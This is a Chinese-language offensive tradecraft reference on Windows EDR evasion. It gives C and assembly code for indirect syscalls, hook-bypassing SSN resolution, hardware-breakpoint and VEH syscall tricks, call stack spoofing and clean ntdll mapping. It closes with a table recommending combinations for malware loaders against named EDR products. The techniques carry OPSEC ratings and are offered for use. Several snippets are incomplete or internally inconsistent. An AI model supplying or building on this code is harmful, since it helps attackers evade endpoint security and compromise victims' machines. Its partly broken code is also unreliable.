# Syscall Techniques & Call Stack Evasion (High-OPSEC Only)

> 所有技术均为 🟢 Low OPSEC。
> **已移除**: Direct Syscalls (syscall 指令在非 ntdll 内存), NTDLL Unhooking (VirtualProtect on .text)

---

## 1. Indirect Syscalls — HellsHall

> OPSEC: 🟢 Low
> Sysmon: 无特定事件
> ETW: syscall 返回地址在 ntdll .text 范围内
> EDR Hooks: 绕过 ntdll inline hook
> 检测难度: 返回地址合法，无异常 syscall 指令位置
> 来源: am0nsec/HellsGate + Halo's Gate

```c
typedef struct _SYSCALL_ENTRY {
    DWORD dwSsn;
    PVOID pSyscallAddr;  // ntdll 中 syscall;ret gadget
} SYSCALL_ENTRY;

SYSCALL_ENTRY FindSyscall(PVOID pNtdll, DWORD dwHash) {
    SYSCALL_ENTRY entry = {0};
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdll +
        nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    PDWORD names = (PDWORD)((PBYTE)pNtdll + exp->AddressOfNames);
    PDWORD funcs = (PDWORD)((PBYTE)pNtdll + exp->AddressOfFunctions);
    PWORD ords = (PWORD)((PBYTE)pNtdll + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (Djb2Hash((PCHAR)((PBYTE)pNtdll + names[i])) != dwHash) continue;
        PBYTE pFunc = (PBYTE)pNtdll + funcs[ords[i]];

        // HellsHall: 直接提取 SSN
        if (pFunc[0]==0x4C && pFunc[1]==0x8B && pFunc[2]==0xD1 && pFunc[3]==0xB8) {
            entry.dwSsn = *(DWORD*)(pFunc + 4);
        } else {
            // Halo's Gate: 搜索邻居 (处理 EDR hook)
            for (int j = 1; j < 500; j++) {
                PBYTE up = pFunc - (j * 0x20);
                if (up[0]==0x4C && up[1]==0x8B && up[2]==0xD1 && up[3]==0xB8) {
                    entry.dwSsn = *(DWORD*)(up+4) + (DWORD)j; break;
                }
                PBYTE dn = pFunc + (j * 0x20);
                if (dn[0]==0x4C && dn[1]==0x8B && dn[2]==0xD1 && dn[3]==0xB8) {
                    entry.dwSsn = *(DWORD*)(dn+4) - (DWORD)j; break;
                }
            }
        }
        // 找到 syscall;ret gadget
        for (DWORD off = 0; off < 0x20; off++) {
            if (pFunc[off]==0x0F && pFunc[off+1]==0x05 && pFunc[off+2]==0xC3) {
                entry.pSyscallAddr = pFunc + off; break;
            }
        }
        break;
    }
    return entry;
}
```

**ASM Stub (x64 MASM):**
```asm
.code
IndirectSyscall PROC
    mov r10, rcx
    mov eax, DWORD PTR [r10]       ; SSN
    jmp QWORD PTR [r10 + 8]        ; jmp ntdll syscall;ret
IndirectSyscall ENDP
END
```

---

## 2. RecycledGate — 全 Hook 模式处理

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: 返回地址在 ntdll 内
> EDR Hooks: 自动识别并绕过所有 hook 类型
> 检测难度: 无论 EDR 用何种 hook 方式都能提取正确 SSN
> 来源: thefLink/RecycledGate

处理的 hook 模式：
- `jmp [addr]` — 6 字节 jmp (CrowdStrike)
- `mov rax, addr; jmp rax` — 12 字节 (SentinelOne)
- `push addr; ret` — 变体 (Sophos)
- `int 3` 断点 (调试器)

```c
// RecycledGate: 识别 hook 类型并搜索干净邻居
BOOL IsHooked(PBYTE pFunc) {
    // 正常 stub: 4C 8B D1 B8 xx xx 00 00
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8)
        return FALSE;
    // jmp hook: E9 xx xx xx xx 或 FF 25 xx xx xx xx
    if (pFunc[0] == 0xE9 || (pFunc[0] == 0xFF && pFunc[1] == 0x25))
        return TRUE;
    // mov rax hook: 48 B8 xx xx xx xx xx xx xx xx FF E0
    if (pFunc[0] == 0x48 && pFunc[1] == 0xB8)
        return TRUE;
    return TRUE; // 任何非标准模式都视为 hook
}

// 使用 RecycledGate 时，FindSyscall 的 Halo's Gate 分支已覆盖此逻辑
// 额外优化: 排序所有 Zw* 函数地址，SSN = 排序后的索引
DWORD RecycledGateGetSsn(PVOID pNtdll, DWORD dwHash) {
    // 收集所有 Zw* 函数地址并排序
    // 目标函数在排序数组中的索引 = SSN
    // 此方法不依赖 stub 字节，完全绕过任何 hook
    PIMAGE_EXPORT_DIRECTORY exp = /* ... 解析导出表 ... */;
    DWORD zwCount = 0;
    struct { PVOID addr; DWORD hash; } zwFuncs[512];

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        PCHAR name = (PCHAR)((PBYTE)pNtdll + names[i]);
        if (name[0] == 'Z' && name[1] == 'w') {
            zwFuncs[zwCount].addr = (PBYTE)pNtdll + funcs[ords[i]];
            zwFuncs[zwCount].hash = Djb2Hash(name);
            zwCount++;
        }
    }
    // 按地址排序 (冒泡/插入排序，无 CRT)
    for (DWORD a = 0; a < zwCount - 1; a++)
        for (DWORD b = a + 1; b < zwCount; b++)
            if (zwFuncs[a].addr > zwFuncs[b].addr) {
                struct { PVOID addr; DWORD hash; } tmp = zwFuncs[a];
                zwFuncs[a] = zwFuncs[b]; zwFuncs[b] = tmp;
            }
    // 查找目标 hash — 索引即 SSN
    // 注: Zw* 和 Nt* 共享 SSN，将 "Nt" 前缀转为 "Zw" 前缀的 hash
    for (DWORD i = 0; i < zwCount; i++)
        if (zwFuncs[i].hash == dwHash) return i;
    return 0;
}
```

---

## 3. HWSyscalls — HWBP + Indirect Syscall + 合法调用栈

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: 调用栈显示 kernel32 → ntdll 路径
> EDR Hooks: 完全绕过 (不执行 ntdll stub 代码)
> 检测难度: 调用栈与合法 API 调用完全一致
> 来源: ShorSec/HWSyscalls

原理：
1. 在 kernel32.dll 中找到 `jmp [ntdll!Nt*]` 类型的 trampoline gadget
2. 设置 HWBP (DR0) 在 ntdll syscall stub 入口
3. VEH handler 捕获断点 → 设置 RAX=SSN → 设置 RIP 到 syscall;ret
4. 调用栈: 你的代码 → kernel32 gadget → ntdll syscall;ret

```c
PVOID g_pSyscallAddr = NULL;
DWORD g_dwSsn = 0;

// VEH Handler: 捕获 HWBP 触发
LONG CALLBACK HwbpHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // 设置 SSN 和跳转到 syscall;ret
        pExInfo->ContextRecord->Rax = g_dwSsn;
        pExInfo->ContextRecord->Rip = (DWORD64)g_pSyscallAddr;
        // 清除 DR0 (单次触发)
        pExInfo->ContextRecord->Dr0 = 0;
        pExInfo->ContextRecord->Dr7 &= ~1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// 设置 HWBP on ntdll stub entry
void SetHwbp(PVOID pTarget) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = (DWORD64)pTarget;
    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 1;  // DR0 enabled, break on execute
    SetThreadContext(GetCurrentThread(), &ctx);
}

// 找到 kernel32 中的 trampoline gadget
PVOID FindK32Trampoline(PVOID pKernel32, PVOID pNtdllFunc) {
    // 搜索 kernel32 .text 中的 call/jmp 到 ntdll 函数的指令
    // 这些是 kernel32 wrapper 函数 (如 CreateFileW → NtCreateFile)
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pKernel32;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)pKernel32 + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    PBYTE pText = (PBYTE)pKernel32 + sec->VirtualAddress;
    DWORD textSize = sec->Misc.VirtualSize;

    for (DWORD i = 0; i < textSize - 6; i++) {
        // FF 25 xx xx xx xx = jmp [rip+offset]
        if (pText[i] == 0xFF && pText[i+1] == 0x25) {
            INT32 offset = *(INT32*)(pText + i + 2);
            PVOID* pTarget = (PVOID*)(pText + i + 6 + offset);
            if (*pTarget == pNtdllFunc) return pText + i;
        }
    }
    return NULL;
}

void HWSyscall(DWORD dwSsn, PVOID pNtFunc, PVOID pSyscallGadget) {
    g_dwSsn = dwSsn;
    g_pSyscallAddr = pSyscallGadget;
    SetHwbp(pNtFunc);  // HWBP 在 ntdll stub 入口
    // 通过 kernel32 trampoline 调用 → 触发 HWBP → VEH 接管
}
```

---

## 4. LayeredSyscall — VEH-based 间接 Syscall

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: 完全合法的调用栈帧
> EDR Hooks: 不触碰 ntdll stub
> 检测难度: 异常处理是合法 Windows 机制，VEH 注册不被监控
> 来源: WKL-Sec/LayeredSyscall (2024)

原理：
1. 注册 VEH
2. 触发受控异常 (如 int 3 或 access violation)
3. VEH handler 设置 RCX/RDX/R8/R9 + stack args
4. 设置 RIP 到 ntdll 中的 syscall;ret gadget
5. 返回 EXCEPTION_CONTINUE_EXECUTION → 直接执行 syscall

```c
// 全局参数传递
typedef struct _SYSCALL_PARAMS {
    DWORD dwSsn;
    PVOID pSyscallAddr;
    DWORD64 args[12];  // 最多 12 个参数
    DWORD argCount;
    NTSTATUS result;
} SYSCALL_PARAMS;

volatile SYSCALL_PARAMS g_params = {0};

LONG CALLBACK LayeredHandler(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT &&
        pEx->ContextRecord->Rip == (DWORD64)&TriggerPoint) {
        // 设置 syscall 参数
        pEx->ContextRecord->Rax = g_params.dwSsn;
        pEx->ContextRecord->R10 = g_params.args[0];
        pEx->ContextRecord->Rdx = g_params.args[1];
        pEx->ContextRecord->R8  = g_params.args[2];
        pEx->ContextRecord->R9  = g_params.args[3];
        // Stack args (5th+ parameter)
        PDWORD64 pStack = (PDWORD64)(pEx->ContextRecord->Rsp + 0x28);
        for (DWORD i = 4; i < g_params.argCount; i++)
            pStack[i - 4] = g_params.args[i];
        // 跳转到 ntdll syscall;ret
        pEx->ContextRecord->Rip = (DWORD64)g_params.pSyscallAddr;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// 触发点 (int 3)
__declspec(noinline) void TriggerPoint(void) { __debugbreak(); }

NTSTATUS LayeredSyscall(SYSCALL_ENTRY* pEntry, DWORD argCount, ...) {
    g_params.dwSsn = pEntry->dwSsn;
    g_params.pSyscallAddr = pEntry->pSyscallAddr;
    g_params.argCount = argCount;
    // 填充参数
    va_list ap; va_start(ap, argCount);
    for (DWORD i = 0; i < argCount; i++)
        g_params.args[i] = va_arg(ap, DWORD64);
    va_end(ap);
    TriggerPoint();  // 触发 VEH → syscall
    return g_params.result;
}
```

---

## 5. Call Stack Spoofing — Fortra HWBP

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: 栈帧完全合法，通过 RtlVirtualUnwind 验证
> EDR Hooks: 无法通过栈回溯识别调用者
> 检测难度: 合成的 unwind info 使栈看起来像正常 API 调用链
> 来源: fortra/hw-call-stack

原理：
1. 构造合成栈帧 (fake return addresses + unwind info)
2. 使用 HWBP 在目标 API 入口触发
3. VEH handler 修改 RSP 指向伪造栈
4. 栈回溯显示: ntdll → kernel32 → kernelbase → 你的合法函数

```c
// 合成栈帧结构
typedef struct _SPOOF_FRAME {
    PVOID pRetAddr;      // 伪造的返回地址 (kernel32/kernelbase 中的 ret gadget)
    PVOID pFrameBase;    // RBP 值
} SPOOF_FRAME;

// 在 kernel32/kernelbase 中找到 ret gadget (C3)
PVOID FindRetGadget(PVOID pModule) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pModule;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    PBYTE pText = (PBYTE)pModule + sec->VirtualAddress;
    for (DWORD i = 0; i < sec->Misc.VirtualSize; i++) {
        if (pText[i] == 0xC3) return pText + i;
    }
    return NULL;
}

// 构建 3 层伪造栈帧
void BuildSpoofStack(SPOOF_FRAME* frames, PVOID pKernel32, PVOID pKernelBase) {
    frames[0].pRetAddr = FindRetGadget(pKernelBase);  // kernelbase!ret
    frames[1].pRetAddr = FindRetGadget(pKernel32);    // kernel32!ret
    frames[2].pRetAddr = NULL;                         // 终止
}
```

---

## 6. NTDLL Fresh Copy (KnownDlls — 无 VirtualProtect)

> OPSEC: 🟢 Low
> Sysmon: 无 (NtOpenSection 不产生文件 I/O 事件)
> ETW: Section 打开是合法操作
> EDR Hooks: 不修改 ntdll .text，仅读取干净副本
> 检测难度: 无 VirtualProtect 调用，无文件读取
> 来源: 替代传统 unhooking 的安全方案

用途: 仅用于 SSN 提取，不用于 unhooking (避免 VirtualProtect 检测)

```c
PVOID GetCleanNtdll(void) {
    // 通过 \KnownDlls\ntdll.dll 获取干净映射
    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us;

    // Stack string: \KnownDlls\ntdll.dll
    wchar_t path[] = {'\\','K','n','o','w','n','D','l','l','s','\\',
                      'n','t','d','l','l','.','d','l','l',0};
    us.Buffer = path;
    us.Length = sizeof(path) - 2;
    us.MaximumLength = sizeof(path);
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // 使用已有的 indirect syscall 打开 section
    SYSCALL_ENTRY ntOpenSec = FindSyscall(pNtdll, HASH_NtOpenSection);
    IndirectSyscall(&ntOpenSec, &hSection, SECTION_MAP_READ, &oa);

    // Map 只读视图
    PVOID pClean = NULL; SIZE_T vSize = 0;
    SYSCALL_ENTRY ntMap = FindSyscall(pNtdll, HASH_NtMapViewOfSection);
    IndirectSyscall(&ntMap, hSection, NtCurrentProcess(), &pClean, 0, 0, NULL,
                    &vSize, 1/*ViewShare*/, 0, PAGE_READONLY);
    return pClean;
}

// 从干净副本提取 SSN (即使当前 ntdll 被 hook)
SYSCALL_ENTRY FindSyscallClean(PVOID pCleanNtdll, DWORD dwHash) {
    // 与 FindSyscall 相同逻辑，但在干净副本上操作
    // 保证 SSN 正确，无需 Halo's Gate 搜索
    return FindSyscall(pCleanNtdll, dwHash);
}
```

---

## 7. 实战集成建议

| 场景 | 推荐方案 | 原因 |
|------|----------|------|
| 基础 loader | HellsHall indirect syscall | 简单有效，绕过 userland hook |
| 对抗 CrowdStrike/S1 | RecycledGate + HWSyscalls | 处理所有 hook 模式 + 合法调用栈 |
| 对抗 ETW 栈检查 | LayeredSyscall | VEH 生成完全合法栈帧 |
| 最高隐蔽 | Fortra stack spoof + LayeredSyscall | 双重保护: syscall + API 调用栈都伪造 |

**组合模式:**
```c
void InitSyscallEngine(void) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);
    // 1. 获取干净 ntdll 副本 (KnownDlls)
    PVOID pClean = GetCleanNtdll();
    // 2. 从干净副本提取所有需要的 SSN
    SYSCALL_ENTRY ntAlloc = FindSyscallClean(pClean, HASH_NtAllocateVirtualMemory);
    SYSCALL_ENTRY ntProt  = FindSyscallClean(pClean, HASH_NtProtectVirtualMemory);
    // ... 其他 syscall
    // 3. syscall;ret gadget 仍从当前 ntdll 获取 (gadget 不会被 hook)
    ntAlloc.pSyscallAddr = FindGadgetInNtdll(pNtdll);
    // 4. 注册 VEH (如果使用 HWSyscalls 或 LayeredSyscall)
    AddVectoredExceptionHandler(1, HwbpHandler);
}
```
